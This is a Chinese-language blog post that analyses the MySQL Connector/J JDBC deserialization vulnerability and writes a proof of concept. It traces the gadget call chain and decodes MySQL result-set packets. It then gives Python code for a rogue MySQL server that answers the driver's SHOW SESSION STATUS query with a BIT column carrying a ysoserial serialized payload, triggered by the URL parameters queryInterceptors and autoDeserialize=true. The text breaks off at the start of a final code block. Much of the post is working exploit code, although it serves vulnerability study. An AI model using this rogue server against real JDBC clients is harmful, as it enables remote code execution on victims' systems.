  <time datetime="2022-01-13T13:46:00.000Z" itemprop="datePublished">2022-01-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/">JDBC反序列化漏洞分析&amp;POC编写</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JDBC反序列化漏洞分析-amp-POC编写"><a href="#JDBC反序列化漏洞分析-amp-POC编写" class="headerlink" title="JDBC反序列化漏洞分析&amp;POC编写"></a><code>JDBC</code>反序列化漏洞分析&amp;<code>POC</code>编写</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>​    在<code>BlackHat Europe 2019</code>议题中，提及到了<code>MySQL JDBC</code>反序列化漏洞。针对不同的版本，有不同的利用方式。</p>
<h2 id="二、利用链分析"><a href="#二、利用链分析" class="headerlink" title="二、利用链分析"></a>二、利用链分析</h2><p>​    首先分析一下<code>mysql 8.0.14</code>版本环境下的利用方式。从一个漏洞挖掘者的视角，来对整个调用链做一个分析。</p>
<p>​    在<code>Java</code>中，如果想要触发反序列化，我们需要调用<code>readObject</code>方法，因此，在寻找整个利用链的过程中，首先需要定位到最后的触发点，也就是我们需要找到哪个地方调用了<code>readObject</code>方法。在该漏洞的利用过程中，最后用到的是<code>ResultSetImpl</code>的<code>getObject</code>方法，我们跟进该方法查看一下代码：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112222551704.png" alt="image-20220112222551704"></p>
<p>​    可以发现这里调用了<code>readObject</code>方法，也就是说，如果这里的<code>data</code>变量我们可以控制的话，就可以利用反序列化链进行攻击。这里先不看这个的<code>data</code>如何进行控制，而是去寻找如何能够触发这个<code>getObject</code>方法。</p>
<p>​    接下来我们找到了<code>ResultSetUtil.resultSetToMap</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223030048.png" alt="image-20220112223030048"></p>
<p>​    如果这里的<code>rs</code>变量传入的是<code>ResultSetImpl</code>对象的话，就可以调用到最上面的<code>getObject</code>方法。接下来需要继续寻找，哪个地方调用了<code>ResultSetUtil.resultSetToMap</code>，我们找到了<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>，其内部调用了上面的<code>ResultSetUtil.resultSetToMap</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png" alt="image-20220112223706987"></p>
<p>​    然后我们继续检索，哪个地方调用了<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>，最后我们找到了<code>ServerStatusDiffInterceptor.preProcess</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112224039235.png" alt="image-20220112224039235"></p>
<p>​    该漏洞前面部分的利用链就到此为止了。在这里需要思考的一个问题是，这里的<code>preProcess</code>方法如何进行调用。这里参考一下官方文档，关于<code>MySQL Connector/J 8.0</code>连接串参数属性<code>https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-statements.html#cj-conn-prop_queryInterceptors</code>。</p>
<p>​    大致解释一下这个<code>queryInterceptors</code>参数，就是指定一个或者多个实现了<code>com.mysql.cj.interceptors.QueryInterceptor</code>接口的类，然后在进行<code>SQL</code>查询操作之前，执行该类中的一个方法从而来影响最终的查询结果，而这个方法就是<code>preProcess</code>方法。（在查询完之后，还会调用其<code>postProcess</code>方法在此进行一个处理）</p>
<p>​    这样，也就能够解释，为什么在构造<code>payload</code>的时候，需要在<code>URL</code>处指定一个<code>queryInterceptors</code>参数。此时还有一个问题，就是上面提到的这个参数，需要在进行<code>SQL</code>查询的时候才能进行触发，而在实际的利用过程中，只需要进行<code>getConnection</code>就能触发。通过简单的调试，可以发现在<code>getConnection</code>过程中，调用了查询语句：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112233233208.png" alt="image-20220112233233208"></p>
<p>​    （我们将断点直接打在<code>ServerStatusDiffInterceptor.preProcess</code>这个方法上面，然后查看整个栈的情况，其实可以发现是通过调用了<code>NativeProtocol</code>类的一些方法后，最终调用了这个<code>preProcess</code>方法，从一个相对比较宏观的角度来看的话，可以按照上面的理解，在进行查询操作之前，就调用了<code>preProcess</code>方法进行了一个处理）</p>
<h2 id="三、mysql数据包"><a href="#三、mysql数据包" class="headerlink" title="三、mysql数据包"></a>三、<code>mysql</code>数据包</h2><p>​    到这里，整个利用的思路就比较清楚了，接下来要做的就是怎么去构造数据，最终能够进行反序列化漏洞的利用。根据上面的分析，我们把关注点放到<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>这个上面：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png" alt="image-20220112223706987"></p>
<p>​    关键部分就是<code>rs</code>变量的构造，因为最后我们需要调用<code>rs.getObject</code>方法来进行触发。简单对整个代码进行分析，最后调用了<code>rs.getObject</code>方法，而在这个方法里面，<code>data</code>变量的值为执行查询语句后返回的表的第一列值（根据<code>columnIndex</code>）。我们对上述代码进行调试，当执行完<code>show session status</code>之后，如果可以执行<code>byte[] data = getBytes(columnIndex);</code>的话，那么<code>data</code>变量的值为：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111639006.png" alt="image-20220113111639006"></p>
<p>​    转换成字符串的形式为<code>Aborted_clients</code>，其对应<code>show session status</code>的第一行第一列数据：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111829934.png" alt="image-20220113111829934"></p>
<p>​    因此，我们的攻击思路是伪造一个<code>Fake Mysql</code>，然后当这里进行查询的时候，返回一个我们想要构造的数据。这里的难点就是如何返回指定的数据。我们在<code>rs</code>这里下一个断点，然后使用<code>wireshark</code>来捕获一下数据包：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113100319423.png" alt="image-20220113100319423"></p>
<p>​    上面最后的两个数据包，就是客户端发送了请求，然后服务端返回给客户端信息。这里我们参考官方给出的返回结果集的数据包格式，来分析一下：<code>https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html</code></p>
<p>​    这里给出的一个示例为查询<code>SELECT @@version_comment</code>后，数据包返回的数据解析，我们先给出在<code>mysql</code>命令行下，输入该命令的返回结果：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112502061.png" alt="image-20220113112502061"></p>
<p>​    然后我们获取数据包，查看返回的数据结果：（这里返回了四个序列）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112739415.png" alt="image-20220113112739415"></p>
<p>​    根据官方文档的解释，我们对每个序列进行一个简单的介绍：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># 第一个序列字段</span><br><span class="line">01 00 00 01 01</span><br><span class="line">前面三个字节表示数据长度，然后接一个01表示sequence id，最后一个01表示返回的列数</span><br><span class="line"></span><br><span class="line"># 第二个序列字段</span><br><span class="line">27 00 00 | 02 | 03 64 65 66 | 00 | 00 | 00 | 11 40 40 76</span><br><span class="line">65 72 73 69 6f 6e 5f 63 6f 6d 6d 65 6e 74 | 00 | 0c |</span><br><span class="line">21 00 | 54 00 00 00 | fd | 00 00 1f 00 00 </span><br><span class="line">这里便于区分，我用|进行分隔开:</span><br><span class="line">- 前面三个字节表示内容的长度</span><br><span class="line">- 02表示sequence id</span><br><span class="line">- 03 64 65 66为catalog</span><br><span class="line">- 00表示schema，不使用一般置为0</span><br><span class="line">- 00表示table</span><br><span class="line">- 00表示org_table</span><br><span class="line">- 下面一段的值为@@version_comment，可以对应我们查询的名称</span><br><span class="line">- 00表示org_name</span><br><span class="line">- 0c表示filter，通常为0c，不用改动</span><br><span class="line">- 21 00 表示character_set</span><br><span class="line">- 54 00 00 00表示column_length</span><br><span class="line">- fd表示column_type，这里是string的意思</span><br><span class="line">- 00 00表示flags</span><br><span class="line">- 1f表示decimals</span><br><span class="line">- 00 00表示filler_2</span><br><span class="line">（大致理解为第二个字段用于定义了返回表的字段的一些信息，比如字段名，字段值类型等）</span><br><span class="line"></span><br><span class="line"># 第三个序列字段</span><br><span class="line">1d 00 00 03 1c 4d 79 53 51 4c 20 43 6f 6d 6d 75 6e 69 74 79 20 53 65 72 76 65 72 20 2d 20 47 50 4c </span><br><span class="line">- 1d 00 00表示内容的长度</span><br><span class="line">- 03表示sequence id</span><br><span class="line">- 后面的部分表示具体的值，也就是对应的MySQL Community Server - GPL</span><br><span class="line">（可以理解为该字段用来定义表中的值）</span><br><span class="line"></span><br><span class="line"># 第四个序列字段</span><br><span class="line">07 00 00 04 fe 00 00 02 00 00 00</span><br><span class="line">- 07 00 00表示内容长度</span><br><span class="line">- 04表示sequence id</span><br><span class="line">- fe表示EOF</span><br><span class="line">- 00表示warning_count</span><br><span class="line">- 02 00表示status_flags，这里的意思为SERVER_STATUS_AUTOCOMMIT</span><br><span class="line">（这个字段主要用于表示结束）</span><br></pre></td></tr></table></figure>

<p>​    通过上面的介绍，我们就可以大致了解每个字段的作用，即分别用于定义列数、列名以及列值。接下来我们就可以大致知道<code>POC</code>怎么进行编写了，一个简单的方式为我们直接把协议的返回字段拿下来，然后修改其中的一部分信息，返回给客户端，即可完成数据的构造（前面的认证过程返回的数据我们直接复制粘贴返回字段值即可）</p>
<h2 id="四、Fake-Mysql编写"><a href="#四、Fake-Mysql编写" class="headerlink" title="四、Fake Mysql编写"></a>四、<code>Fake Mysql</code>编写</h2><p>​    接下来我们来编写一个完成认证过程的<code>Fake Mysql</code>服务端，可以直接粘贴获取<code>Response</code>数据包的值即可：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113121901554.png" alt="image-20220113121901554"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>

<p>​    然后使用<code>jdbc</code>来进行连接，可以查看到客户端最后发送了一个<code>SHOW SESSION STATUS</code>的查询：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113131216243.png" alt="image-20220113131216243"></p>
<p>​    根据前面的介绍，<code>SHOW SESSION STATUS</code>查询过后，如果能够执行<code>byte[] data = getBytes(columnIndex);</code>，<code>data</code>的值最后的结果为<code>Aborted_clients</code>，我们查找一下这个字符串，然后根据上面的分析，修改一下长度以及字符串内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line">part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part3 = &quot;3c00000303646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730556616c75650556616c75650cff0000100000fd0000000000&quot;</span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line">part4 = &quot;090000&quot; + &quot;0406&quot; + &quot;6d31736e3077&quot; + &quot;0139&quot;</span><br><span class="line">part5 = &quot;070000b3fe000002000000&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br></pre></td></tr></table></figure>

<p>​    关键就在于修改上面的<code>part4</code>，需要修改前三个字节，第5个字节，以及想要构造的<code>payload</code>，按照上面的构造完成之后，通过调试可以发现，最后的值替换成了<code>m1sn0w</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113134413031.png" alt="image-20220113134413031"></p>
<p>​    接下来开始正式构造<code>POC</code>，也就是我们需要开始控制条件语句，让其最终能够执行到<code>byte[] data = getBytes(columnIndex);</code>，并调用<code>readObject</code>方法，回到最终调用的<code>getObject</code>方法中：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113143110175.png" alt="image-20220113143110175"></p>
<p>​    这里有三个主要的条件需要我们进行控制。第一个是获取的字段的<code>mysql</code>类型必须为<code>BIT</code>，关于<code>BIT</code>的描述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * BIT[(M)]</span><br><span class="line"> * A bit-field type. M indicates the number of bits per value, from 1 to 64. The default is 1 if M is omitted.</span><br><span class="line"> * Protocol: FIELD_TYPE_BIT = 16</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>​    前面在描述第二个序列的时候，有介绍到<code>fd</code>这个值，表示的就是<code>varchar</code>类型，我们查看一下官方文档，即<code>10</code>对应的就是<code>BIT</code>类型。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113135808743.png" alt="image-20220113135808743"></p>
<p>​    因此在最后构造<code>POC</code>的时候，只需要将<code>part2</code>后面的<code>fd</code>更改为<code>10</code>即可执行这个条件语句：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113142408784.png" alt="image-20220113142408784"></p>
<p>​    第二个绕过部分为<code>autoDeserialize</code>，只需要设置<code>URL</code>参数为<code>autoDeserialize=true</code>即可。第三个部分就是判断我们构造的<code>payload</code>数据前两个字节是否为<code>-84</code>和<code>-19</code>，这其实就是序列化数据的标志。因此，最后的<code>POC</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line"># part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000100110000000&quot;</span><br><span class="line">part3 = &quot;3c00000303646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730556616c75650556616c75650cff0000100000fd0000000000&quot;</span><br><span class="line"></span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line">part4 = &quot;090000&quot; + &quot;04&quot; + &quot;payload长度&quot; + &quot;payload&quot; + &quot;0139&quot;</span><br><span class="line">part5 = &quot;070000b3fe000002000000&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br><span class="line"></span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line">            elif b&quot;SHOW SESSION STATUS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resPayload))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>

<p>（这里有个坑，就是上面介绍<code>payload</code>前面那个字节表示<code>payload</code>的长度，如果说<code>payload</code>过长，需要两个或者多个字节来表示长度的话，就需要在前面加上一个<code>fc</code>）</p>
<p>​    验证漏洞的话，我导入一个<code>commons-collection3.1</code>，利用<code>ysoserial</code>生成<code>payload</code>，确定长度后即可进行攻击了（这里选用了<code>CommonsCollections5</code>）：（代码有点乱，但是大致思路就是这样）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"># 